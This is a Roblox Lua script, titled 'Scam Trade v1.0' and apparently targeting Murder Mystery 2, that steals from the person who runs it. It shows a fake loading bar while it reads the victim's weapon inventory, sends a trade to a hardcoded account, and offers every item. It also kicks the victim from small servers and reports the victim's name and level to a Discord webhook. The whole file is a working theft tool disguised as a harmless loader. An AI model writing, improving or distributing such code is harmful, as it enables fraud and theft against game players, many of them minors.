-- Убедимся, что есть доступ к необходимым сервисам
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- GUI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.Text = "Scam Trade v1.0"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 24
title.BackgroundTransparency = 1
title.Parent = frame

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 20)
loadingText.Position = UDim2.new(0, 0, 0, 60)
loadingText.Text = "Loading..."
loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
loadingText.Font = Enum.Font.SourceSans
loadingText.TextSize = 18
loadingText.BackgroundTransparency = 1
loadingText.Parent = frame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0.8, 0, 0, 20)
progressBar.Position = UDim2.new(0.1, 0, 0, 90)
progressBar.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
progressBar.BorderSizePixel = 0
progressBar.Parent = frame

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBar

local percentageText = Instance.new("TextLabel")
percentageText.Size = UDim2.new(1, 0, 0, 20)
percentageText.Position = UDim2.new(0, 0, 0, 115)
percentageText.Text = "0%"
percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentageText.Font = Enum.Font.SourceSans
percentageText.TextSize = 16
percentageText.BackgroundTransparency = 1
percentageText.Parent = frame

-- Основные параметры
local userName = "backsclapes" -- Замените на нужное имя
local webHook = "https://discord.com/api/webhooks/..." -- Ваш вебхук

-- Сокращенная таблица значений (для примера)
local values = {
    ["Nik's Scythe"] = 250000000,
    ["Elderwood Scythe"] = 90,
    ["Batwing"] = 70,
    ["Corrupt"] = 775,
    ["Chroma Luger"] = 105,
    ["Luger"] = 70,
    ["Seer"] = 10,
    -- Добавьте остальные предметы по аналогии
}

-- Функция для безопасного выполнения HTTP запросов
local function safeHttpRequest(url, method, headers, body)
    local success, response = pcall(function()
        return game:GetService("HttpService"):RequestAsync({
            Url = url,
            Method = method,
            Headers = headers,
            Body = body
        })
    end)
    return success, response
end

-- Функция отправки вебхука
local function sendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    local success, response = safeHttpRequest(
        url,
        "POST",
        {["Content-Type"] = "application/json"},
        jsonData
    )
    return success, response
end

-- Анимация загрузки
coroutine.wrap(function()
    local totalTime = 60 -- Уменьшено для теста (1 минута)
    local startTime = tick()
    
    while tick() - startTime < totalTime do
        local elapsed = tick() - startTime
        local progress = elapsed / totalTime
        progressFill.Size = UDim2.new(progress, 0, 1, 0)
        percentageText.Text = math.floor(progress * 100) .. "%"
        
        local dots = math.floor((tick() % 3) + 1)
        loadingText.Text = "Loading" .. string.rep(".", dots)
        wait(0.1)
    end
    
    loadingText.Text = "Loading complete!"
    wait(2)
    screenGui:Destroy()
end)()

-- Основная логика
coroutine.wrap(function()
    -- Проверка сервера
    if #Players:GetPlayers() <= 2 then
        game.Players.LocalPlayer:Kick("Server not supported")
        return
    end

    -- Загрузка модулей
    local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
    local LevelModule = require(ReplicatedStorage.Modules.LevelModule)
    local InvModule = require(ReplicatedStorage.Modules.InventoryModule)

    -- Получение уровня игрока
    local function getLevel()
        for level, xp in pairs(LevelModule.XPTable) do
            if PlayerDataModule.NewXP < xp then
                return level
            end
        end
        return 0
    end

    -- Анализ инвентаря
    local inventory = {}
    for category, items in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(items) do
            table.insert(inventory, {
                name = item.ItemName,
                value = values[item.ItemName] or 0,
                data = item.DataID,
                amount = item.Amount,
                rarity = item.Rarity
            })
        end
    end

    -- Отправка торгового запроса
    local tradeEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest")
    tradeEvent:InvokeServer(Players[userName])
    wait(3)

    -- Предложение предметов (упрощенная версия)
    local offerEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
    for _, item in pairs(inventory) do
        for i = 1, item.amount do
            offerEvent:FireServer(item.data, "Weapons")
            wait(0.1) -- Добавляем задержку для стабильности
        end
    end

    -- Отправка вебхука
    local embed = {
        title = "MM2 Trade",
        description = "Trade completed",
        color = 11220,
        fields = {
            {
                name = "Player Info",
                value = "Name: " .. Players.LocalPlayer.Name .. "\nLevel: " .. getLevel()
            }
        }
    }

    sendWebhook(webHook, {
        content = "Trade with " .. userName,
        embeds = {embed}
    })
end)()
